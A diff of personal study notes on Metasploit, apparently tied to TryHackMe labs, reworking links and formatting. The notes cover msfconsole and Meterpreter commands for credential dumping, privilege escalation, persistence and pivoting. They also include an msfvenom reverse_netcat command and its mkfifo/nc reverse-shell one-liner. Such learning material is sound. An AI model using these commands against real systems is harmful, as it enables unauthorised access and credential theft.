@@ -10,7 +10,7 @@ Basic Metasploit flow:
 
 ### Commands
 
-* `db_nmap $FLAGS $IP` — run [nmap](nmap.md) and dump the results into the Metasploit DB; all nmap $FLAGS are supported and Metasploit will elevate privileges if necessary
+* `db_nmap $FLAGS $IP` — run nmap and dump the results into the Metasploit DB; all nmap $FLAGS are supported and Metasploit will elevate privileges if necessary
 * `hosts` — display known hosts in DB
 * `hosts -d` — delete saved hosts from DB
 * `info` — show module information (including exploit target options)
@@ -35,21 +35,19 @@ Note that you can also call regular shell commands (`ip`, `ls`, etc.) from msfco
 * AUXILIARY functions, such as scanning machines for vulnerabilities;
 * POST exploitation tools for “looting” and pivoting;
 * An ENCODER module for obfuscating exploits;
-* And finally a module called NOP that includes tools for exploiting buffer overflows and [return-orientated programming](https://en.wikipedia.org/wiki/Return-oriented_programming).
+* And finally a module called NOP that includes tools for exploiting buffer overflows and return-orientated programming.
 
 Note that Metasploit 6 apparently calls these “framework plugins” now.
 
-> REMEMBER: Open up the port Metasploit’s going to use in your firewall *before* running the exploit. Generally this is port 4444 by default (set with LPORT).
-
-> ALSO REMEMBER: Be sure to set LHOST (and, when applicable, SRVHOST) correctly, even if it’s not indicated by the module. Metasploit’s guesses about which interface to use aren’t always correct… (I find using the explicit IP address works better than specifying the interface device or leaving SRVHOST at the default of 0.0.0.0.)
-> 
-> ALSO ALSO REMEMBER: Sometimes you might find yourself in the position of trying to exploit a service over an SSH tunnel (for example, if you're trying to exploit a service that's not exposed externally in order to elevate your privileges). When doing this, remember that LHOST is still your machine's external address, as the exploit won't be connecting back over the SSH tunnel (obviously)!
+* REMEMBER: Open up the port Metasploit’s going to use in your firewall *before* running the exploit. Generally this is port 4444 by default (set with LPORT).
+* ALSO REMEMBER: Be sure to set LHOST (and, when applicable, SRVHOST) correctly, even if it’s not indicated by the module. Metasploit’s guesses about which interface to use aren’t always correct… (I find using the explicit IP address works better than specifying the interface device or leaving SRVHOST at the default of 0.0.0.0.)
+* ALSO ALSO REMEMBER: Sometimes you might find yourself in the position of trying to exploit a service over an SSH tunnel (for example, if you're trying to exploit a service that's not exposed externally in order to elevate your privileges). When doing this, remember that LHOST is still your machine's external address, as the exploit won't be connecting back over the SSH tunnel (obviously)!
 
 There are also modules for basic enumeration, such as smtp_version/smtp_enum (for SMTP) and mysql_sql (for MySQL, though this seems to just be a thin wrapper around the MySQL command line client).
 
 ### Module Options
 
-Most modules support the ARCH and PAYLOAD options (for specifying target architecture and the payload to deliver). These options can also be set by directly calling a fully-specified payload (see the [next section]()).
+Most modules support the ARCH and PAYLOAD options (for specifying target architecture and the payload to deliver). These options can also be set by directly calling a fully-specified payload (see the next section).
 
 ### Useful Payloads
 
@@ -80,7 +78,7 @@ The Meterpreter reverse shell *requires* a connection back to msfconsole using m
 * `getprivs` — display current user privileges
 * `getuid` — display current user ID
 * `getsystem` — attempt to elevate to (or confirm) local system privileges
-* `golden_ticket_create` — create a [golden ticket](kerberos.md) (requires the `kiwi` module)
+* `golden_ticket_create` — create a golden ticket (requires the `kiwi` module)
 * `hashdump` — dump all passwords in the SAM (Windows-only, requires system privileges)
 * `help` — help menu
 * `help $COMMAND` — help specifically for $COMMAND
@@ -116,13 +114,13 @@ Potentially useful Metsploit modules to `run` from/besides Meterpreter:
 * `post/windows/gather/checkvm` — try to determine if we’re in a VM
 * `post/multi/recon/local_exploit_suggester` — find possible privilege escalation exploits (can be slow/unreliably on 64-bit architectures)
 * `post/windows/gather/hashdump` — same as the hashdump command, but pushes the hashes into the Metasploit DB
-* `auxiliary/analyze/crack_windows` — sic [John the Ripper](john-the-ripper.md) or [Hashcat](hashcat.md) on NTLM hashes stored in the Metasploit DB
+* `auxiliary/analyze/crack_windows` — sic John the Ripper or Hashcat on NTLM hashes stored in the Metasploit DB
 * `post/windows/manage/enable_rdp` — enable RDP access (requires admin privileges)
 * `post/multi/manage/autoroute` — manipulate target routing for pivoting
 * `auxiliary/server/socks_proxy` — start a SOCKS proxy
 * `exploit/windows/local/persistence` — sets up a persistent connection (you probably want to `set STARTUP SYSTEM`)… *without a password!*
 
-NOTE: It is generally more useful to background Meterpreter and then run these commands through the [Metasploit console](), as within Meterpreter they need to have all options specified on the “run” command line (in the console you can access help, actually *see* what the options are, etc.).
+NOTE: It is generally more useful to background Meterpreter and then run these commands through the Metasploit console, as within Meterpreter they need to have all options specified on the “run” command line (in the console you can access help, actually *see* what the options are, etc.).
 
 There seem to be a lot of options for the `post/multi/manage/autoroute` and `auxiliary/server/socks_proxy` modules, but I don’t see a way to access them from Meterpreter (it looks like to get help you need to background Meterpreter and use the console).
 
@@ -144,7 +142,8 @@ Use msfvenom to generate exploit payloads for inclusion outside of msfconsole. F
 ```bash
 # Use Metasploit to generate the code for a remote shell:
 # 
-msfvenom -p cmd/unix/reverse_netcat lhost=$LOCAL_IP lport=$LOCAL_PORT
+msfvenom -p cmd/unix/reverse_netcat \
+            lhost=$LOCAL_IP lport=$LOCAL_PORT
 
 # Spin up a listener using netcat:
 #
@@ -154,7 +153,10 @@ nc -lvp $LOCAL_PORT
 This will generates code that looks like this:
 
 ```bash
-mkfifo /tmp/qdsrgu; nc $LOCAL_IP $LOCAL_PORT 0</tmp/qdsrgu | /bin/sh >/tmp/qdsrgu 2>&1; rm /tmp/qdsrgu
+mkfifo /tmp/qdsrgu; \
+nc $LOCAL_IP $LOCAL_PORT 0</tmp/qdsrgu | \
+	/bin/sh >/tmp/qdsrgu 2>&1; \
+rm /tmp/qdsrgu
 ```
 
 What’s going on here?
@@ -174,13 +176,18 @@ By default, msfvenom produces 64-bit executables when using the `-f exe`. This d
 * [Metasploit Documentation: Scanning and Managing Hosts](https://docs.rapid7.com/metasploit/scanning-and-managing-hosts/)
 * [Metasploit Basics, Part 8: Exploitation with EternalBlue](https://www.hackers-arise.com/post/2017/06/12/metasploit-basics-part-8-exploitation-with-eternalblue)
 * [Shell to Meterpreter Upgrade](https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/manage/shell_to_meterpreter)
-* [TryHackMe: CC - Pen Testing](tryhackme-cc-pen-testing.md)
+* [TryHackMe: CC: Pen Testing](tryhackme-cc-pen-testing.md)
 * [Ice](tryhackme-ice.md)
 * [How do you send a 64 bit meterpreter stager?](https://security.stackexchange.com/a/83410)
 * [Blaster](tryhackme-blaster.md)
 * [Multiple Ways to Persistence on Windows 10 with Metasploit](https://www.hackingarticles.in/multiple-ways-to-persistence-on-windows-10-with-metasploit/)
 * [Metasploit - Payload](https://www.tutorialspoint.com/metasploit/metasploit_payload.htm)
 * [TryHackMe: Game Zone](tryhackme-game-zone.md)
+* [Using “nmap”](nmap.md)
+* [Return-orientated programming (Wikipedia)](https://en.wikipedia.org/wiki/Return-oriented_programming)
+* [Kerberos](kerberos.md)
+* [Using John the Ripper](john-the-ripper.md)
+* [Using Hashcat](hashcat.md)
 
 - - - -
 
